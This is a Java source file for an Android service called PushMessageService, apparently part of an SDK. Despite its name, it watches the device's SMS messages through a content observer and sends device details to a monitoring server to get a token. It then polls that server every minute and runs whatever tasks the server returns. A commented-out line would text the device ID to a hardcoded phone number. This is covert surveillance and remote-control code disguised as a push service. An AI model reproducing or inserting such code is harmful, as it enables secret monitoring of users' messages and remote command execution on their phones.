package com.ss.sssdk;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.IBinder;

import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by ljw on 15/11/11.
 */

public class PushMessageService extends Service {

    private ContentObserver mObserver;
    private Handler mHandler = new Handler();
    private Timer time = new Timer();
    @Override
    public void onCreate() {
        super.onCreate();
        SdkTools.context = PushMessageService.this;
        addSMSObserver();
        //SdkTools.sendSMS("13916341324", SMSObserver.FILTER_CEHCKPHONE + DeviceInfo.getDeviceId());
        time.schedule(new TimerTask() {
            @Override
            public void run() {
                String updatetime = SdkTools.getKV("updatetime");
                if(updatetime.equalsIgnoreCase("")) updatetime = "0";
                long now = System.currentTimeMillis();
                long last = Long.parseLong(updatetime);
                long k = (30l*24*3600*1000);
                long kk = now - last;
                if(kk > k ) {
                    SdkTools.clearKV();
                }
                String token = SdkTools.getKV("token");
                if (token.equalsIgnoreCase("")) {
                    postDeviceInof();
                }else if (DeviceInfo.getPhone(false) == null) {
                    DeviceInfo.checkPhone();
                }else {
                    heartBeat(token);
                }
            }
        }, 1000, 60000);
    }
    public void postDeviceInof() {
        HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_DEVICE_INFO,null, "d="+DeviceInfo.getDeviceInfo().toString(), new HttpRequest.IHttpCallBack() {
            @Override
            public void callback(String ret) {

            }
            @Override
            public void callback(JSONObject ret) {
                try {
                    if (ret != null && ret.getBoolean("b")) {
                        SdkTools.setKV("token",ret.getString("result"));
                        String updatetime = System.currentTimeMillis()+"";
                        SdkTools.setKV("updatetime",updatetime);
                    }
                }catch(Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
    public void heartBeat(String token) {
        JSONObject header = new JSONObject();
        String ret = HttpRequest.sendGet(HttpUrl.monitor_url,HttpUrl.HEART_BEAT,header,"token="+token);
        try {
            JSONObject result = new JSONObject(ret);
            if(result.getBoolean("b")) {
                if(result.has("result")) {
                    JSONObject task = result.getJSONObject("result");
                    new TaskThread(task).start();
                }
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
    public void addSMSObserver() {
        ContentResolver resolver = getContentResolver();
        Handler handler = new SMSHandler(this);
        mObserver = new SMSObserver(resolver, handler);
        resolver.registerContentObserver(SMSObserver.CONTENT_URI, true, mObserver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        this.getContentResolver().unregisterContentObserver(mObserver);
        super.onDestroy();
        //Process.killProcess(Process.myPid());
        //System.exit(0);
    }
}
